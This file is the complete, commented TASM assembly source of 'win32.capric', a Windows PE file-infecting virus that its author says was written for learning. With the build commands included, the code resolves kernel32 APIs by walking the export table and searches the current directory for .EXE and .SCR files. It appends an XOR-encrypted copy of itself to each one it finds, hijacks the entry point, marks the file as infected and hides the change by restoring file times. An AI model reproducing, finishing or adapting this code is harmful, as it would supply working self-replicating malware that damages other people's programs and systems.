; win32.capric
;
; A basic win32-pe-infection virus I made just to learn how the stuff works in
; win32. Read code / comments to learn more.
;                 
; compile with: tasm32 /ml gv.asm,,;
;               tlink32 /x /Tpe /c gv.obj,gv.exe,,import32.lib
; and set code-section writeable:                            
;               editbin /SECTION:CODE,rwe gv.exe            
;                                                          
; / capsyl                         
;
.586p
.model flat, stdcall

extrn MessageBoxA:PROC
extrn ExitProcess:PROC


.data

; debug-stuff, (only 1st gen) .
	msgt db	"hey, hoh",0
	msgm db	"1st GENERATiON iS DONE.",0

.code
start:
	
	virsz		equ	vend-dstart
	decsz		equ	vstart-dstart

dstart:	
	call	delta
delta:	pop	ebp
	sub	ebp,	offset delta

	; first gen ? if so, don't decrypt virus
	or	ebp,	ebp
	jz	vstart

	; decrypt virus-code 
	mov	ebx,	90909090h	; changes
	dkey=dword ptr $-4		; .
	lea	esi,	[ebp+vstart]
	mov	edi,	esi
	mov	ecx,	virsz/4
decr1:	lodsd
	xor	eax,	ebx
	stosd
	loop	decr1

	db	0e9h
	dd	00000000h
	laban	equ	dword ptr $-4

;	- V i R U S -
vstart:

; start out by getting the base-addr of the kernel, (kernel32.dll)
; take a value from stack, dec it till we hit the start of the kernel
	mov	ebx,		[esp]
	and	ebx,		0ffff0000h
	mov	ecx,		50h
getk32:	cmp	word ptr [ebx], "ZM"
	jz	short gotk32
	sub	ebx,	10000h
	loop	getk32
	stc
gotk32:	jc	retback			; ...	
	mov	[ebp+kernelbase], ebx

	; these change during the infection,
	; so save them, 
	push	dword ptr [ebp+tmpep]
	pop	dword ptr [ebp+oldep]
	push	dword ptr [ebp+tmpib]
	pop	dword ptr [ebp+oldib]

	; get address of the GetProcAddr API
gAPI:
	push	ebx
	pop	edx	; kernelbase in edx
	add	edx,	[edx+3ch]
	add	edx,	78h
	mov	edx,	[edx]		
	add	edx,	ebx         ; export table	 
	mov	esi,	[edx+20h]   ; Address of Names (RVA)
	add	esi,	ebx         ; ptrs in esi
	xor	ecx,	ecx         ; counter
get_GetProcAddr:
	inc	ecx        	; inc counter
	lodsd
	add	eax,	ebx	; heya!
	cmp	[eax],	'PteG'
	jnz	get_GetProcAddr
	cmp	[eax+4],'Acor'
	jnz	get_GetProcAddr
	cmp	[eax+8],'erdd'
	jnz	get_GetProcAddr

	; got it.
	; addr = couter*2, (in ordinals), then result times 4 (in addr)
	mov	edi,	ebx	; kb in edi
	mov	ebx,	[edx+24h]
	add	ebx,	edi
	movzx	ecx,	word ptr [ebx+2*ecx]; counter*2 +addr of ordinals
	sub	ecx,	[edx+10h]
	mov	ebx,	[edx+1Ch]
	add	ebx,	edi		; VA
	mov	edx,	[ebx+4*ecx]	; oye
	add	edx,	edi
	mov	dword ptr [ebp+aGetProcAddr], edx

	; got it.

	; gAPIs: ebx = kernelbase, esi = apis, 
	;        edi = place 2 store addr.

	; get apis from kernel32.dll
	mov	ebx,	[ebp+kernelbase]
	lea	esi,	[ebp+k32APIs]
	lea	edi,	[ebp+k32APIa]
	call	gAPIs	

	; get apis from user32.dll 	
	lea	eax,	dword ptr [ebp+user32dll]
	push	eax
	call	dword ptr [ebp+aLoadLibraryA]
	mov	ebx,	eax
	lea	esi,	[ebp+u32APIs]
	lea	edi,	[ebp+u32APIa]
	call	gAPIs	

	; find files, (only current dir) and infect them
	; (2 PE-files at a time)
	call	findNinf

	; ret back 
	or	ebp,	ebp
	jz	exit1stgen

retback:
	call	goodmsg
	mov	eax,	[ebp+oldep]
	add	eax,	[ebp+oldib]
	jmp	eax	; jump to hosts real entrypoint	

goodmsg:
	pushad
	lea	eax,	[ebp+msgm_A]
	lea	ebx,	[ebp+msgt_A]	
	call	[ebp+aMessageBoxA],0,eax,ebx,0
	popad
	ret

; -----------------

; findNinf routine, finds file(s), then jumps to preinf
; and opens & maps it, then checkfile and at last infectFile 
findNinf:
; open current dir.
	lea	edi,	[ebp+currdir]
	call	[ebp+aGetCurrentDirectoryA],7Fh,edi

	; get other dirs...

	call	infectDir
	ret

infectDir:
	mov	byte ptr [ebp+infcounter], ninfections 
	lea	eax,	[ebp+exemask]
	call	findFile

	mov	byte ptr [ebp+infcounter], ninfections
	lea	eax,	[ebp+scrmask]
	call	findFile

	ret

; find one file, (get search handle)
findFile:
	lea	ebx,	[ebp+searchData]
	call	[ebp+aFindFirstFileA],eax,ebx
	; save search-handle
	mov	[ebp+searchHndl], eax
	jmp	preinf

; find more files
findFiles:
	; clear out old filename
	xor	eax,	eax
	lea	edi,	[ebp+searchData.wfd_FileName]
	mov	ecx,	260
	rep	stosb
	; find more files
	lea	eax,	[ebp+searchData]
	call	[ebp+aFindNextFileA],[ebp+searchHndl],eax	
	or	eax,	eax
	jz	CloseSearchHndl          ; no more, close handle

; "prepare" found file, open, map
preinf:
	cmp	byte ptr [ebp+infcounter], 0 
	jz	CloseSearchHndl

	lea	esi,	[ebp+searchData.wfd_FileName]
	; set fileattributes to "any file"
	call	[ebp+aSetFileAttributesA],esi,80h

	; open file, existing rw 
	call	[ebp+aCreateFileA],esi,0C0000000h,0,0,3,0,0

	inc	eax
	jz	findFiles		
	dec	eax
	mov	[ebp+fileHndl],	eax

; first map to only check the header 
	mov	ecx,	040h
	call	mapit

checkFile:
	; check if MZ-sign
	cmp	word ptr [eax],	'ZM'
	jnz	demapfile	
	mov	esi,	[eax+3Ch]	
	add	esi,	eax
	; check PE-sign
	cmp	dword ptr [esi], 'EP'
	jnz	demapfile	
	; check if already infected
	cmp	byte ptr [esi+3Bh],	'X'
	jz		demapfile	

	; oh, a nice file (or is it?), infect it
	; first close the maphandle
	call	[ebp+aUnmapViewOfFile],[ebp+mapAddr]
	call	[ebp+aCloseHandle],[ebp+mapHndl]

	; now map the file + extra
	mov	ecx,	[ebp+searchData.wfd_FileSizeLow]
	add	ecx,	virsz+1000h
	call	mapit
	jmp	infectFile		; infect file

; mapping routine, ecx holds how much to map
mapit:
	push	ecx
	call	[ebp+aCreateFileMappingA],[ebp+fileHndl],0,4,0,ecx,0
	or	eax,	eax
	jz	closefile	
	mov	[ebp+mapHndl],	eax
	
	pop	ecx	; how much to map 

	; mappy, (eax = map-handle)	
	call	[ebp+aMapViewOfFile],eax,2,0,0,ecx
	mov	[ebp+mapAddr],	eax
	ret

infectFile:
	mov	esi,	[eax+3Ch]
	add	esi,	eax
	mov	edi,	esi
	; get addr of last section
	mov	ebx,	[esi+74h]         ; dir-entries
	shl	ebx,	3                 ; * 8 (size)
	movzx	eax,	word ptr [esi+6]  ; sections
	dec	eax                       ; last one
	mov	ecx,	28h               ; * (size)
	mul	ecx                       ; .
	add	esi,	78h               ; dir-table
	add	esi,	ebx               ; add them
	add	esi,	eax               ; and addr in esi

	; addr of last section in esi
	; start of pe-hdr in edi	

	; set section RWE 
	or	dword ptr [esi+24h],	0A0000020h	


	; save old entrypoint and imagebase
	mov	eax,         [edi+28h]
	mov	[ebp+tmpep], eax	
	mov	eax,         [edi+34h]
	mov	[ebp+tmpib], eax

	; calculate new entrypoint 
	mov	eax,	[esi+0Ch]      ; VirtualAddress
	add	eax,	[esi+10h]      ; SizeOfRawData 
	mov	[ebp+newep],	eax    ; save virus-entrypoint
	mov	[edi+28h],	eax    ;
	
	; get where to write virus 
	mov	ebx,	[esi+10h]      ; SizeOfRawData
	add	ebx,	[esi+14h]      ; PointerToRawData
	push	ebx                    ; offset in file of where to write vir

	; align the new size to add
	xor	edx,	edx            ;
	mov	eax,	[esi+10h]      ; SizeOfRawData
	add	eax,	virsz          ; add with sizeof vir
	push	eax                    ;
	mov	ecx,	[edi+3Ch]      ; alignment
	div	ecx                    ; eax / ecx, remanining in edx
	pop	eax                    ;
	sub	ecx,	edx            ;	
	add	eax,	ecx            ; aligned size in eax
	; set new size of section, file  
	mov	[esi+10h],	eax    ; SizeOfRawData
	mov	[esi+08h],	eax    ; VirtualSize
	add	eax,	[esi+0Ch]      ; VirtualAddress	
	mov	[edi+50h],	eax    ; SizeOfImage

	; get random vaule for en/de-cryption, and save
	call	[ebp+aGetTickCount]
	mov	[ebp+dkey],	eax
	mov	[ebp+ekey],	eax


; - writing things to file -
	
	
	pop	ebx                    ; offset in file
	mov	byte ptr [edi+3Bh],'X' ; infection mark

	lea	esi,	[ebp+dstart]   ;
	xchg	ebx,	edi            ; phdr in ebx, offset in edi
	add	edi,	[ebp+mapAddr]  ; normalize
	mov	ecx,	decsz          ;
	rep 	movsb                  ; write decryptor
	
	; now encrypt virus and write it to the file
encr:
	mov	ebx,	90909090h	
	ekey=dword ptr $-4
	lea	esi,	[ebp+vstart]
	mov	ecx,	virsz/4
encr1:	lodsd
	xor	eax,	ebx
	stosd
	loop	encr1

	dec	byte ptr [ebp+infcounter]	
	
	
	jmp	unmapfile

; to get it right with no-good files
demapfile:
	mov	ecx,	[ebp+searchData.wfd_FileSizeLow]
	call	[ebp+aSetFilePointer],[ebp+fileHndl],ecx,0,0
	call	[ebp+aSetEndOfFile],[ebp+fileHndl]

; unmap and close file
unmapfile:	call	[ebp+aUnmapViewOfFile],[ebp+mapAddr]
closemap:	call	[ebp+aCloseHandle],[ebp+mapHndl]
closefile:	call	[ebp+aCloseHandle],[ebp+fileHndl]	

; set back the original fileattributes
setdefattrib:	
	lea	eax,	[ebp+searchData.wfd_CreationTime]
	lea	ebx,	[ebp+searchData.wfd_LastAccessTime]
	lea	ecx,	[ebp+searchData.wfd_LastWriteTime]
	call	[ebp+aSetFileTime],[ebp+fileHndl],eax,ebx,ecx

	lea	eax, [ebp+searchData.wfd_FileName]
	call	[ebp+aSetFileAttributesA],eax, \
			[ebp+searchData.wfd_FileAttributes]

	; find more files
	jmp	findFiles

CloseSearchHndl:
	call	[ebp+aFindClose], [ebp+searchHndl]
findDone:
	ret

; Gets apis from dlls usings GetProcAddr
gAPIs: ; ebx = dll to get from, esi = ptr to api-name, edi = save .
	push	esi
	push	ebx
	call	dword ptr [ebp+aGetProcAddr]	
	test	eax,	eax
	jz	gexit	
	stosd
g1:	; get next api
	inc	esi
	cmp	byte ptr [esi], 0
	jnz	g1
	inc	esi
	cmp	byte ptr [esi], 0FFh ; end of 'em 
	jnz	gAPIs
gexit:
	ret

; DATA -------------------------------------------------------- 

filetime                  STRUC      ; filetime structure
   ft_dwLowDateTime            dd ?    
   ft_dwHighDateTime           dd ?   
filetime                  ENDS  ;

win32_find_data	          STRUC 
   wfd_FileAttributes          dd ?   
   wfd_CreationTime            filetime ?   
   wfd_LastAccessTime          filetime ?  
   wfd_LastWriteTime           filetime ? 
   wfd_FileSizeHigh            dd ?      
   wfd_FileSizeLow             dd ?      
   wfd_Reserved0               dd ?         
   wfd_Reserved1               dd ?         
   wfd_FileName                dd 260 dup(?)
   wfd_AlternateFileName       dd 13 dup(?)
       	                       dd  3 dup(?)      ;	padding 
win32_find_data           ENDS        

	searchData	win32_find_data	?
	searchHndl	dd	0
	exemask		db	"*.EXE",0
	scrmask		db	"*.SCR",0
	currdir		db	7Fh dup (0)
	ninfections	equ	8	
	infcounter	db	ninfections 

	fileattr	dd	0
	fileHndl	dd	0
	mapHndl		dd	0
	mapAddr		dd	0
	
	kernelbase	dd	0
	user32dll	db	'USER32.DLL',0

	newep		dd	0
	oldep		dd	01000h	
	tmpep		dd	0
	oldib		dd	0
	tmpib		dd	0

;  the info-msg
	msgt_A 		db	"infO",0 
	msgm_A 		db	"hm,hm, iNFECTED I AM.... virsz: " 
			db	virsz/10000 MOD 10 + 30h
			db	virsz/01000 MOD 10 + 30h
			db	virsz/00100 MOD 10 + 30h
			db	virsz/00010 MOD 10 + 30h
			db	virsz/00001 MOD 10 + 30h
			db	" bytes.",0

; APIs . 
	sGetProcAddr            db 'GetProcAddr',0
	aGetProcAddr            dd 0
k32APIs:
	sLoadLibraryA           db 'LoadLibraryA',0
	sExitProcess            db 'ExitProcess',0
	sCreateFileA            db 'CreateFileA',0
	sCloseHandle            db 'CloseHandle',0
	sFindFirstFileA         db 'FindFirstFileA',0
	sFindNextFileA          db 'FindNextFileA',0
	sFindClose              db 'FindClose',0
	sSetFilePointer         db 'SetFilePointer',0
	sSetEndOfFile           db 'SetEndOfFile',0
	sSetFileAttributesA     db 'SetFileAttributesA',0
	sSetFileTimeA           db 'SetFileTime',0
	sGetCurrentDirectoryA   db 'GetCurrentDirectoryA',0
	sCreateFileMappingA     db 'CreateFileMappingA',0
	sMapViewOfFile          db 'MapViewOfFile',0
	sUnmapViewOfFile        db 'UnmapViewOfFile',0
	sGetTickCount           db 'GetTickCount',0
	                        db 0FFh
u32APIs:
	sMessageBoxA            db 'MessageBoxA',0
	                        db 0FFh
k32APIa:
	aLoadLibraryA           dd	0
	aExitProcess            dd	0
	aCreateFileA            dd	0
	aCloseHandle            dd	0
	aFindFirstFileA         dd	0
	aFindNextFileA          dd	0
	aFindClose              dd	0
	aSetFilePointer         dd	0
	aSetEndOfFile           dd	0
	aSetFileAttributesA     dd	0
	aSetFileTime            dd	0
	aGetCurrentDirectoryA   dd	0
	aCreateFileMappingA     dd	0
	aMapViewOfFile          dd	0
	aUnmapViewOfFile        dd	0
	aGetTickCount           dd	0

u32APIa:
	aMessageBoxA            dd	0


vend: ; the end of virus

; 1st Generation .
exit1stgen:	; ofGHG! 
	call	MessageBoxA,0,offset msgm,offset msgt,0
	call	ExitProcess,0


end start






















